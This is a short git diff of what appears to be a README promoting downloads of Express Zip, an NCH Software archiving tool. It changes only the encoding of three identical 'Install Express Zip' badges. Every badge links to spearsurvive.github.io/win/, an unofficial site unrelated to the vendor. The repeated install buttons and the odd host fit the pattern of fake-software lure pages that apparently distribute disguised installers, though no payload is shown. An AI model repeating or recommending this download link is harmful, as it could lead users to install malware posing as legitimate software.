@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Express Zip](https://img.shields.io/badge/⬇_Install_Express%20Zip-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Express Zip](https://img.shields.io/badge/⬇_Install_Express+Zip-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Express Zip is a file compression and archiving tool from NCH Software for Windo
 
 <div align="center">
 
-[![⬇ Install Express Zip](https://img.shields.io/badge/⬇_Install_Express%20Zip-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Express Zip](https://img.shields.io/badge/⬇_Install_Express+Zip-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Express Zip is a file compression and archiving tool from NCH Software for Windo
 
 <div align="center">
 
-[![⬇ Install Express Zip](https://img.shields.io/badge/⬇_Install_Express%20Zip-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Express Zip](https://img.shields.io/badge/⬇_Install_Express+Zip-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
